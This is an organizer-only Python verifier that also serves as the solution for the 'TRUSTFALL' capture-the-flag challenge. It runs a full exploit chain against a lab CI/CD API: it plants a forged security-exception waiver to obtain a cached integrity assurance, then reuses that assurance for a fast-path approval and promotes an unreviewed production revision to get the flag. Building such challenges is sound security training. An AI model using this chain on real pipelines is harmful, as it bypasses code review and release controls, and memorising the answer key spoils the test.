"""Organizer-only verifier. Never copy this file into a deployed image."""
from __future__ import annotations

import json
import os
import time

import httpx


BASE = os.environ.get("TRUSTFALL_URL", "http://127.0.0.1:8080")
EXPECTED_FLAG = os.environ.get("EXPECTED_FLAG")
RULE = "s3-bucket-logging"
CLEAN_ARTIFACT_STORAGE = 'resource "aws_s3_bucket" "artifacts" {\n  bucket = "trustfall-artifacts"\n  logging {\n    target_bucket = "central-audit-logs"\n    target_prefix = "artifacts/"\n  }\n}\n'


def wait(client: httpx.Client, run: str) -> dict:
    for _ in range(60):
        state = client.get(f"{BASE}/api/runs/{run}").json()
        if state["status"] in {"passed", "failed", "stale"}: return state
        time.sleep(1)
    raise RuntimeError("pipeline timed out")


def commit(client: httpx.Client, tree: dict, head: str) -> str:
    response = client.post(f"{BASE}/api/commits", json={"expected_head": head, "tree": tree}); response.raise_for_status()
    return response.json()["commit"]


def sarif_results(sarif: dict) -> list[dict]:
    return [result for run in sarif.get("runs", []) if isinstance(run, dict) for result in run.get("results", []) if isinstance(result, dict)]


def accepted_logging_finding(sarif: dict) -> dict:
    for result in sarif_results(sarif):
        properties = result.get("properties", {})
        if result.get("ruleId") == RULE and isinstance(properties, dict) and properties.get("waiverResource") == "aws_s3_bucket.artifacts" and any(item.get("kind") == "external" and item.get("status") == "accepted" for item in result.get("suppressions", []) if isinstance(item, dict)):
            return result
    raise AssertionError(f"accepted {RULE} waiver for aws_s3_bucket.artifacts not found")


def main() -> None:
    with httpx.Client(timeout=10) as client:
        repo = client.get(f"{BASE}/api/repository").json(); tree, head = repo["tree"], repo["head"]
        baseline_exceptions = tree.get("security-exceptions.json")
        candidate_ref = repo["candidate_ref"]
        # Start the poisoning run from an eligible staging candidate, even if a
        # previous attempt left the mutable candidate pointing at production.
        tree["release.json"] = json.dumps({"action": "promote", "target": "staging"})
        tree["infra/storage.tf"] = 'resource "aws_s3_bucket" "artifacts" {\n  bucket = "trustfall-artifacts"\n}\n'
        tree["security-exceptions.json"] = json.dumps({"exceptions": [{"rule_id": RULE, "resource": "aws_s3_bucket.artifacts", "owner": "platform-security", "ticket": "SEC-1842", "status": "accepted", "expires": "2030-12-31", "justification": "Temporary exception while centralized access logging migration is completed."}]})
        poisoned = commit(client, tree, head)
        first = wait(client, client.post(f"{BASE}/api/runs", json={"commit": poisoned}).json()["run"])
        first_review = first["review"]
        sarif = client.get(f"{BASE}/api/runs/{first['id']}/artifacts/results.sarif").json()
        assert len(sarif_results(sarif)) >= 5
        accepted_logging_finding(sarif)
        assert first["status"] == "passed"
        assert first_review["assurance_updated"] and first_review["review_path"] == "full"
        assert any(event["event"] == "security_observation_recorded" and event["result"] == "stored" for event in first_review["events"])
        assert first["approval"]["deployment_candidate"] is None
        assert first["approval"]["reviewed_revision"] == poisoned[:12]
        assert any(item["control"] == "release-integrity" and item["state"] == "VERIFIED" and item["scope"] == "repository" and item["originating_run"] == first["id"] and item["artifact"] == "results.sarif" for item in client.get(f"{BASE}/api/assurances").json())
        denied = client.post(f"{BASE}/api/releases", json={"candidate_ref": candidate_ref, "action": "promote", "target": "production"})
        assert denied.status_code == 403
        tree["infra/storage.tf"] = CLEAN_ARTIFACT_STORAGE
        if baseline_exceptions is None:
            tree.pop("security-exceptions.json", None)
        else:
            tree["security-exceptions.json"] = baseline_exceptions
        tree["README.md"] += "approved normal maintenance\n"; approved = commit(client, tree, poisoned)
        second = wait(client, client.post(f"{BASE}/api/runs", json={"commit": approved}).json()["run"])
        second_review, approval = second["review"], second["approval"]
        assert second["status"] == "passed" and second_review["historical_assurances_used"] >= 1 and not second_review["assurance_updated"]
        assert approval["status"] == "approved" and approval["reviewed_revision"] == approved[:12]
        assert approval["deployment_candidate"] == candidate_ref
        assert approval["policy_tier"] == "expedited"
        assert second_review["review_path"] == "fast"
        clean_sarif = client.get(f"{BASE}/api/runs/{second['id']}/artifacts/results.sarif").json()
        assert not any(item.get("ruleId") == RULE and item.get("properties", {}).get("resource") == "aws_s3_bucket.artifacts" for item in sarif_results(clean_sarif))
        tree["release.json"] = json.dumps({"action": "promote", "target": "production"})
        production = commit(client, tree, approved)
        assert production[:12] != approval["reviewed_revision"]
        response = client.post(f"{BASE}/api/releases", json={"candidate_ref": candidate_ref, "action": "promote", "target": "production"}); response.raise_for_status()
        lease = response.json()["lease"]
        if not lease.startswith("H7CTF{") or lease == "H7CTF{}": raise AssertionError("unexpected lease")
        if EXPECTED_FLAG and lease != EXPECTED_FLAG: raise AssertionError("release returned the wrong instance flag")
        print(lease)


if __name__ == "__main__": main()
